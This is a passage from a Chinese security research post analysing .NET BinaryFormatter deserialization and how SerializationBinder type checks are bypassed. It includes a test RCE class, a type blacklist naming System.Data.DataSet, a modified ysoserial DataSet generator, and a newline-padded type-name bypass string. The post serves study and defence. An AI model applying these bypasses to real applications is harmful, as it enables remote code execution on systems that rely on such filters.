            <span class="c1">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span>
            <span class="k">protected</span> <span class="nf">Myser</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Deserial"</span><span class="p">);</span>
                <span class="n">n1</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetInt32</span><span class="p">(</span><span class="s">"i"</span><span class="p">);</span>
                <span class="n">n2</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetInt32</span><span class="p">(</span><span class="s">"j"</span><span class="p">);</span>
                <span class="n">str</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">"k"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">void</span> <span class="n">ISerializable</span><span class="p">.</span><span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Serialize"</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"i"</span><span class="p">,</span> <span class="n">n1</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"j"</span><span class="p">,</span> <span class="n">n2</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"k"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

            <span class="p">}</span>
        <span class="p">}</span>
<span class="na">        [Serializable]</span>
        <span class="k">class</span> <span class="nc">RCE</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="kt">string</span> <span class="n">cmd</span><span class="p">;</span>

            <span class="k">public</span> <span class="nf">RCE</span><span class="p">(</span><span class="kt">string</span> <span class="n">cmd</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">this</span><span class="p">.</span><span class="n">cmd</span> <span class="p">=</span> <span class="n">cmd</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">public</span> <span class="k">override</span> <span class="kt">string</span> <span class="nf">ToString</span><span class="p">()</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="s">"cmd"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">class</span> <span class="nc">Version2DeserializationBinder</span> <span class="p">:</span> <span class="n">SerializationBinder</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="k">override</span> <span class="n">Type</span> <span class="nf">BindToType</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeName</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetExecutingAssembly</span><span class="p">().</span><span class="n">GetType</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">RCE</span><span class="p">)))</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">Type</span> <span class="n">typeToDeserialize</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="s">"{0}, {1}"</span><span class="p">,</span> <span class="n">typeName</span><span class="p">,</span> <span class="n">assemblyName</span><span class="p">));</span>
                    <span class="k">return</span> <span class="n">typeToDeserialize</span><span class="p">;</span>
                <span class="p">}</span>




                <span class="c1">//    Console.WriteLine($"assemblyName:{assemblyName},typeName:{typeName}.");</span>
                <span class="c1">//    Type typeToDeserialize = Type.GetType(String.Format("{0}, {1}", typeName, assemblyName));</span>

                <span class="c1">//    if (typeToDeserialize.Equals(typeof(RCE)))</span>
                <span class="c1">//    {</span>
                <span class="c1">//        //throw new Exception("can't deseriliza rce class.");</span>
                <span class="c1">//        Console.WriteLine("can't deseriliza rce class.");</span>
                <span class="c1">//        return null;</span>
                <span class="c1">//    }</span>
                <span class="c1">//    return typeToDeserialize;</span>
                <span class="c1">//}</span>


            <span class="p">}</span>

            <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">@"C:\Users\Administrator\source\repos\ConsoleApp3\ConsoleApp3\2.txt"</span><span class="p">;</span>
                <span class="n">Myser</span> <span class="n">myser</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Myser</span><span class="p">();</span>
                <span class="n">myser</span><span class="p">.</span><span class="n">n1</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
                <span class="n">myser</span><span class="p">.</span><span class="n">n2</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
                <span class="n">RCE</span> <span class="n">rce</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">(</span><span class="s">"calc"</span><span class="p">);</span>

                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
                <span class="c1">//SerializeToFile(filename, myser);</span>
                <span class="c1">//   SerializeToFile(filename, rce);</span>
                <span class="n">FiletoDeserial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="p">}</span>



            <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">SerializeToFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">,</span> <span class="kt">object</span> <span class="n">myser</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// C:\\Users\\sangfor\\source\\repos\\ConsoleApp4\\ConsoleApp4\\1.txt</span>

                <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Write</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
                <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
                <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">,</span> <span class="n">myser</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">FiletoDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
                <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
                <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Binder</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Version2DeserializationBinder</span><span class="p">();</span>
                <span class="kt">object</span> <span class="n">obj</span> <span class="p">=</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span><span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">);</span>


                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>

            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<h3 data-content="1" id="98fa4c15ddfa7f9bd397ee43d9e3098d">失效的SerializationBinder</h3>
<p>在调试过程中发现obj并不是为空的，而是被赋值了，说明是能正常反序列化的。<code>SerializationBinder</code>并没有起作用</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201231-1759caa8-7e30-1.png"/></p>
<div class="highlight"><pre><span></span><span class="k">internal</span> <span class="kt">object</span> <span class="nf">Deserialize</span><span class="p">(</span><span class="n">Stream</span> <span class="n">serializationStream</span><span class="p">,</span> <span class="n">HeaderHandler</span> <span class="n">handler</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">fCheck</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">isCrossAppDomain</span><span class="p">,</span> <span class="n">IMethodCallMessage</span> <span class="n">methodCallMessage</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">serializationStream</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">ArgumentNullException</span><span class="p">(</span><span class="s">"serializationStream"</span><span class="p">,</span> <span class="n">Environment</span><span class="p">.</span><span class="n">GetResourceString</span><span class="p">(</span><span class="s">"ArgumentNull_WithParamName"</span><span class="p">,</span> <span class="n">serializationStream</span><span class="p">));</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">serializationStream</span><span class="p">.</span><span class="n">CanSeek</span> <span class="p">&amp;&amp;</span> <span class="n">serializationStream</span><span class="p">.</span><span class="n">Length</span> <span class="p">==</span> <span class="m">0L</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">SerializationException</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">GetResourceString</span><span class="p">(</span><span class="s">"Serialization_Stream"</span><span class="p">));</span>
            <span class="p">}</span>

            <span class="n">InternalFE</span> <span class="n">internalFE</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InternalFE</span><span class="p">();</span>
            <span class="n">internalFE</span><span class="p">.</span><span class="n">FEtypeFormat</span> <span class="p">=</span> <span class="n">m_typeFormat</span><span class="p">;</span>
            <span class="n">internalFE</span><span class="p">.</span><span class="n">FEserializerTypeEnum</span> <span class="p">=</span> <span class="n">InternalSerializerTypeE</span><span class="p">.</span><span class="n">Binary</span><span class="p">;</span>
            <span class="n">internalFE</span><span class="p">.</span><span class="n">FEassemblyFormat</span> <span class="p">=</span> <span class="n">m_assemblyFormat</span><span class="p">;</span>
            <span class="n">internalFE</span><span class="p">.</span><span class="n">FEsecurityLevel</span> <span class="p">=</span> <span class="n">m_securityLevel</span><span class="p">;</span>
            <span class="n">ObjectReader</span> <span class="n">objectReader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ObjectReader</span><span class="p">(</span><span class="n">serializationStream</span><span class="p">,</span> <span class="n">m_surrogates</span><span class="p">,</span> <span class="n">m_context</span><span class="p">,</span> <span class="n">internalFE</span><span class="p">,</span> <span class="n">m_binder</span><span class="p">);</span>
            <span class="n">objectReader</span><span class="p">.</span><span class="n">crossAppDomainArray</span> <span class="p">=</span> <span class="n">m_crossAppDomainArray</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">objectReader</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">handler</span><span class="p">,</span> <span class="k">new</span> <span class="n">__BinaryParser</span><span class="p">(</span><span class="n">serializationStream</span><span class="p">,</span> <span class="n">objectReader</span><span class="p">),</span> <span class="n">fCheck</span><span class="p">,</span> <span class="n">isCrossAppDomain</span><span class="p">,</span> <span class="n">methodCallMessage</span><span class="p">);</span>
        <span class="p">}</span>
</pre></div>
<p>调用<code>objectReader.Deserialize</code>进行解析，反序列化的时候会调用 <code>ObjectReader#GetType</code>-&gt;<code>ObjectReader#Bind</code> 来获取 Type 类型</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201240-1d350956-7e30-1.png"/></p>
<div class="highlight"><pre><span></span><span class="na">[SecurityCritical]</span>
        <span class="k">internal</span> <span class="n">Type</span> <span class="nf">Bind</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyString</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeString</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">m_binder</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">type</span> <span class="p">=</span> <span class="n">m_binder</span><span class="p">.</span><span class="n">BindToType</span><span class="p">(</span><span class="n">assemblyString</span><span class="p">,</span> <span class="n">typeString</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="n">type</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">type</span> <span class="p">=</span> <span class="n">FastBindToType</span><span class="p">(</span><span class="n">assemblyString</span><span class="p">,</span> <span class="n">typeString</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">type</span><span class="p">;</span>
        <span class="p">}</span>
</pre></div>
<p>以上代码<code>type = m_binder.BindToType(assemblyString, typeString);</code>调用我们自定义的binder的BindToType方法获取Type对象，这里如果获取Type为空时，并不是直接抛出异常，而是调用<code>FastBindToType</code>方法继续获取Type。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201251-235a2712-7e30-1.png"/></p>
<div class="highlight"><pre><span></span><span class="na">[SecurityCritical]</span>
        <span class="k">internal</span> <span class="n">Type</span> <span class="nf">FastBindToType</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeName</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">ObjectReader</span><span class="p">.</span><span class="n">TypeNAssembly</span> <span class="n">typeNAssembly</span> <span class="p">=</span> <span class="p">(</span><span class="n">ObjectReader</span><span class="p">.</span><span class="n">TypeNAssembly</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="n">typeCache</span><span class="p">.</span><span class="n">GetCachedValue</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">typeNAssembly</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">typeNAssembly</span><span class="p">.</span><span class="n">assemblyName</span> <span class="p">!=</span> <span class="n">assemblyName</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Assembly</span> <span class="n">assembly</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">bSimpleAssembly</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">try</span>
                    <span class="p">{</span>
                        <span class="n">ObjectReader</span><span class="p">.</span><span class="n">sfileIOPermission</span><span class="p">.</span><span class="n">Assert</span><span class="p">();</span>
                        <span class="k">try</span>
                        <span class="p">{</span>
                            <span class="n">assembly</span> <span class="p">=</span> <span class="n">ObjectReader</span><span class="p">.</span><span class="n">ResolveSimpleAssemblyName</span><span class="p">(</span><span class="k">new</span> <span class="n">AssemblyName</span><span class="p">(</span><span class="n">assemblyName</span><span class="p">));</span>
                        <span class="p">}</span>
                        <span class="k">finally</span>
                        <span class="p">{</span>
                            <span class="n">CodeAccessPermission</span><span class="p">.</span><span class="n">RevertAssert</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
                    <span class="p">{</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">assembly</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="n">ObjectReader</span><span class="p">.</span><span class="n">GetSimplyNamedTypeFromAssembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">,</span> <span class="n">typeName</span><span class="p">,</span> <span class="k">ref</span> <span class="n">type</span><span class="p">);</span>
                <span class="p">}</span>
</pre></div>
<p><code>ObjectReader.ResolveSimpleAssemblyName(new AssemblyName(assemblyName));</code>获取Assembly对象，<code>ObjectReader.GetSimplyNamedTypeFromAssembly(assembly, typeName, ref type);</code>来获取Assembly里面的type对象</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201304-2b2a7ce4-7e30-1.png"/></p>
<p>所以以上<code>SerializationBinder#BindToType</code>返回null其实是无效的，正确的做法是抛出异常</p>
<div class="highlight"><pre><span></span><span class="n">List</span><span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;</span> <span class="n">blackTypeName</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">};</span>
       <span class="k">private</span> <span class="k">void</span> <span class="nf">_AddBlackList</span><span class="p">()</span>
       <span class="p">{</span>
           <span class="n">blackTypeName</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">"System.Data.DataSet"</span><span class="p">);</span>
       <span class="p">}</span>
       <span class="k">public</span> <span class="k">override</span> <span class="n">Type</span> <span class="nf">BindToType</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeName</span><span class="p">)</span>
       <span class="p">{</span>
           <span class="k">this</span><span class="p">.</span><span class="n">_AddBlackList</span><span class="p">();</span>
           <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">t</span> <span class="k">in</span> <span class="n">blackTypeName</span><span class="p">)</span>
           <span class="p">{</span>
               <span class="k">if</span> <span class="p">(</span><span class="n">typeName</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
               <span class="p">{</span>
                   <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="p">();</span>
               <span class="p">}</span>
           <span class="p">}</span>
           <span class="k">return</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201315-31fd14b4-7e30-1.png"/></p>
<h3 data-content="1" id="ab3a6896ee07d1a1d4792bc00a7f66a1">SerializationBinder绕过</h3>
<div class="highlight"><pre><span></span><span class="na">[SecurityCritical]</span>
 <span class="k">internal</span> <span class="n">Type</span> <span class="nf">FastBindToType</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeName</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
     <span class="n">TypeNAssembly</span> <span class="n">typeNAssembly</span> <span class="p">=</span> <span class="p">(</span><span class="n">TypeNAssembly</span><span class="p">)</span><span class="n">typeCache</span><span class="p">.</span><span class="n">GetCachedValue</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">typeNAssembly</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">typeNAssembly</span><span class="p">.</span><span class="n">assemblyName</span> <span class="p">!=</span> <span class="n">assemblyName</span><span class="p">)</span>
     <span class="p">{</span>
         <span class="n">Assembly</span> <span class="n">assembly</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">bSimpleAssembly</span><span class="p">)</span>
         <span class="p">{</span>
             <span class="k">try</span>
             <span class="p">{</span>
                 <span class="n">sfileIOPermission</span><span class="p">.</span><span class="n">Assert</span><span class="p">();</span>
                 <span class="k">try</span>
                 <span class="p">{</span>
                     <span class="n">assembly</span> <span class="p">=</span> <span class="n">ResolveSimpleAssemblyName</span><span class="p">(</span><span class="k">new</span> <span class="n">AssemblyName</span><span class="p">(</span><span class="n">assemblyName</span><span class="p">));</span>
                 <span class="p">}</span>
                 <span class="k">finally</span>
                 <span class="p">{</span>
                     <span class="n">CodeAccessPermission</span><span class="p">.</span><span class="n">RevertAssert</span><span class="p">();</span>
                 <span class="p">}</span>
             <span class="p">}</span>
             <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
             <span class="p">{</span>
             <span class="p">}</span>

             <span class="k">if</span> <span class="p">(</span><span class="n">assembly</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
             <span class="p">{</span>
                 <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
             <span class="p">}</span>

             <span class="n">GetSimplyNamedTypeFromAssembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">,</span> <span class="n">typeName</span><span class="p">,</span> <span class="k">ref</span> <span class="n">type</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="k">else</span>
         <span class="p">{</span>
             <span class="k">try</span>
             <span class="p">{</span>
                 <span class="n">sfileIOPermission</span><span class="p">.</span><span class="n">Assert</span><span class="p">();</span>
                 <span class="k">try</span>
                 <span class="p">{</span>
                     <span class="n">assembly</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">assemblyName</span><span class="p">);</span>
                 <span class="p">}</span>
                 <span class="k">finally</span>
                 <span class="p">{</span>
                     <span class="n">CodeAccessPermission</span><span class="p">.</span><span class="n">RevertAssert</span><span class="p">();</span>
                 <span class="p">}</span>
             <span class="p">}</span>
             <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
             <span class="p">{</span>
             <span class="p">}</span>

             <span class="k">if</span> <span class="p">(</span><span class="n">assembly</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
             <span class="p">{</span>
                 <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
             <span class="p">}</span>

             <span class="n">type</span> <span class="p">=</span> <span class="n">FormatterServices</span><span class="p">.</span><span class="n">GetTypeFromAssembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">,</span> <span class="n">typeName</span><span class="p">);</span>
         <span class="p">}</span>

         <span class="k">if</span> <span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="n">type</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
         <span class="p">{</span>
             <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="n">CheckTypeForwardedTo</span><span class="p">(</span><span class="n">assembly</span><span class="p">,</span> <span class="n">type</span><span class="p">.</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">type</span><span class="p">);</span>
         <span class="n">typeNAssembly</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TypeNAssembly</span><span class="p">();</span>
         <span class="n">typeNAssembly</span><span class="p">.</span><span class="n">type</span> <span class="p">=</span> <span class="n">type</span><span class="p">;</span>
         <span class="n">typeNAssembly</span><span class="p">.</span><span class="n">assemblyName</span> <span class="p">=</span> <span class="n">assemblyName</span><span class="p">;</span>
         <span class="n">typeCache</span><span class="p">.</span><span class="n">SetCachedValue</span><span class="p">(</span><span class="n">typeNAssembly</span><span class="p">);</span>
     <span class="p">}</span>

     <span class="k">return</span> <span class="n">typeNAssembly</span><span class="p">.</span><span class="n">type</span><span class="p">;</span>
 <span class="p">}</span>
</pre></div>
<p>再来细看一下<code>FastBindToType</code>的代码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201328-397bec06-7e30-1.png"/></p>
<p>先使用<code>typeName</code>从缓存里面获取<code>TypeNAssembly</code>对象</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201335-3d98f61c-7e30-1.png"/></p>
<p>该对象存储<code>Type</code>和<code>assemblyName</code>程序集名</p>
<p>如果能从缓存中获取到则执行<code>typeNAssembly.type;</code>返回Type对象</p>
<p>如果获取为空，则走到上面的if判断，调用<code>ResolveSimpleAssemblyName(new AssemblyName(assemblyName));</code>获取<code>assemblyName</code>指定的<code>Assembly</code>对象，然后调用<code>GetSimplyNamedTypeFromAssembly(assembly, typeName, ref type);</code>获取对应的Type对象。</p>
<p>结合以上代码知道，在<code>BindToType</code>方法只检测<code>typeName</code>的时候可以通过在系列化修改<code>assemblyName</code>值的方式进行绕过。</p>
<p>修改<code>ysoserial\Generators\DataSetGenerator.cs</code></p>
<div class="highlight"><pre><span></span><span class="k">public</span> <span class="k">void</span> <span class="nf">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// info.SetType(typeof(System.Data.DataSet));</span>

            <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataSet</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">FullTypeName</span> <span class="p">=</span> <span class="n">type</span><span class="p">.</span><span class="n">AssemblyQualifiedName</span><span class="p">;</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.RemotingFormat"</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SerializationFormat</span><span class="p">.</span><span class="n">Binary</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.DataSetName"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.Namespace"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.Prefix"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.CaseSensitive"</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.LocaleLCID"</span><span class="p">,</span> <span class="m">0</span><span class="n">x409</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.EnforceConstraints"</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.ExtendedProperties"</span><span class="p">,</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">PropertyCollection</span><span class="p">)</span><span class="k">null</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.Tables.Count"</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"DataSet.Tables_0"</span><span class="p">,</span> <span class="n">_fakeTable</span><span class="p">);</span>
        <span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201347-45057560-7e30-1.png"/></p>
<p>原生POC</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201355-49840c8c-7e30-1.png"/></p>
<p>修改 后的poc</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201400-4cd512fa-7e30-1.png"/></p>
<p>对比下来typeName 一个是<code>System.Data.DataSet</code>，一个是<code>System.Data.DataSet, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</code></p>
<p>但是传递<code>FullName</code> 去获取Type，其实都是为null。因为用的是<code>Type.GetType();</code>该方法需要<code>AssemblyQualifiedName</code>去获取这是判断逻辑的错误</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201408-516a16ee-7e30-1.png"/></p>
<p>以上的判断是因为判断不够严谨导致的绕过</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201416-564511aa-7e30-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201422-59c74e42-7e30-1.png"/></p>
<h3 data-content="1" id="195b14612702a100919403181a1d1ac4">字符绕过方式1</h3>
<p>看到以下代码</p>
<div class="highlight"><pre><span></span><span class="kt">string</span> <span class="n">typeName</span> <span class="p">=</span> <span class="s">"\n\n\n\n\n\n\nSystem.Data.DataSet,\n\n\n\n\n\n\n System.Data, Version=4.0.0.0,\n\n\n\n\n\n\n Culture=neutral, PublicKeyToken=b77a5c561934e089\n\n\n\n\n\n\n"</span><span class="p">;</span>
